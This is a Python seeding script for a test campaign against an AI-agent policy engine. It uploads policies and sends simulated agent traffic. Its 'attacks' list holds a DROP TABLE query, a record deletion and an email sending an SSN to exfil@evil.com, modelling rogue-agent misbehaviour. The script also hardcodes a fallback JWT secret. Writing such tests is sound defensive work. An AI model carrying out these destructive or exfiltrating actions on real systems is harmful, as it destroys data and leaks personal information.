#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Defect-hunt campaign seeder — multi-tenant policies + agents (trust tiers) + traffic, all via the API.

Stdlib only (urllib). Reads the API base + HS256 secret from env. Writes a machine-readable count summary
that 10-seed.sh folds into SEED-MANIFEST.md. Idempotent-ish (policy create is upsert; traffic just adds rows).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys
import time
import urllib.request
from pathlib import Path

API = os.environ.get("API_BASE", "http://127.0.0.1:18080").rstrip("/")
SECRET = os.environ.get("SECRET", "campaign-secret-7f3c91aa2b")
REGO = Path(os.environ.get("REPO_ROOT", ".")) / "comprehensive.rego"


def mint(role: str, ns: str = "default", cluster: str = "*") -> str:
    b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
    hdr = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    now = int(time.time())
    claims = {"sub": f"{role}-{ns}", "role": role, "namespace": ns, "cluster": cluster, "iat": now, "exp": now + 86400}
    pay = b64(json.dumps(claims, separators=(",", ":")).encode())
    sig = b64(hmac.new(SECRET.encode(), hdr + b"." + pay, hashlib.sha256).digest())
    return (hdr + b"." + pay + b"." + sig).decode()


def call(method: str, path: str, token: str, body: dict | None = None) -> tuple[int, dict]:
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(API + path, data=data, method=method,
                                 headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"detail": raw[:200]}
    except Exception as e:  # connection error
        return 0, {"detail": str(e)}


def evaluate(token: str, tool: str, params: dict, ns: str, agent_class: str, sa: str, trust: float = 0.8) -> dict:
    body = {
        "tool_name": tool, "tool_params": params,
        "agent_identity": {"spiffe_id": f"spiffe://norviq/ns/{ns}/sa/{sa}", "namespace": ns, "agent_class": agent_class},
        "session_id": f"seed-{sa}", "trust_score": trust, "chain_depth": 0,
    }
    _, out = call("POST", "/api/v1/evaluate", token, body)
    return out


def main() -> int:
    admin = mint("admin", "default", "*")
    rego = REGO.read_text(encoding="utf-8")

    # ---- POLICIES: comprehensive rego across tenants/classes (the attack baseline + multi-ns enforcement) ----
    policy_targets = [
        ("default", "customer-support"), ("default", "payments-bot"),
        ("team-a", "team-a-bot"), ("payments", "summarizer"),
        ("analytics", "report-gen"), ("platform", "code-assistant"),
    ]
    pol_ok = 0
    for ns, cls in policy_targets:
        st, out = call("POST", "/api/v1/policies", admin,
                       {"namespace": ns, "agent_class": cls, "rego_source": rego,
                        "enforcement_mode": "block", "saved_by": "campaign-seed", "priority": 700})
        if st == 200:
            pol_ok += 1
        else:
            print(f"  [policy] {ns}:{cls} -> {st} {out.get('detail','')}", file=sys.stderr)

    # ---- AGENTS + TRAFFIC across trust tiers ----
    benign = [("search_kb", {"q": "orders"}), ("get_order", {"id": "123"}), ("get_customer", {"id": "c1"})]
    attacks = [("execute_sql", {"query": "DROP TABLE customers"}), ("delete_record", {"id": "1"}),
               ("send_email", {"to": "exfil@evil.com", "body": "SSN 123-45-6789"})]

    agents = [
        # (sa, ns, class, tier, n_benign, n_attack, trust)
        ("chatbot-prod", "default", "customer-support", "high", 6, 0, 0.9),
        ("rogue-bot", "default", "customer-support", "low", 1, 6, 0.5),
        ("mixed-bot", "team-a", "team-a-bot", "medium", 3, 3, 0.7),
        ("ledger-bot", "payments", "summarizer", "high", 4, 1, 0.85),
        ("etl-loader", "analytics", "report-gen", "medium", 2, 2, 0.7),
        ("copilot", "platform", "code-assistant", "high", 3, 1, 0.8),
    ]
    allow_n = block_n = 0
    for sa, ns, cls, tier, nb, na, trust in agents:
        for i in range(nb):
            tool, p = benign[i % len(benign)]
            d = evaluate(admin, tool, p, ns, cls, sa, trust)
            allow_n += 1 if d.get("decision") == "allow" else 0
            block_n += 1 if d.get("decision") == "block" else 0
        for i in range(na):
            tool, p = attacks[i % len(attacks)]
            d = evaluate(admin, tool, p, ns, cls, sa, trust)
            allow_n += 1 if d.get("decision") == "allow" else 0
            block_n += 1 if d.get("decision") == "block" else 0

    # ---- FROZEN agent (admin-only trust mutation) ----
    frozen_id = "spiffe://norviq/ns/default/sa/kiosk-bot"
    evaluate(admin, "search_kb", {"q": "x"}, "default", "customer-support", "kiosk-bot")  # register it first
    fz_st, _ = call("PUT", f"/api/v1/agents/{frozen_id}/trust", admin, {"score": 0.0})

    summary = {
        "policies_seeded": pol_ok, "policy_targets": len(policy_targets),
        "agents": len(agents) + 1, "traffic_allow": allow_n, "traffic_block": block_n,
        "frozen_set": fz_st == 200,
    }
    print("SEED_SUMMARY=" + json.dumps(summary))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
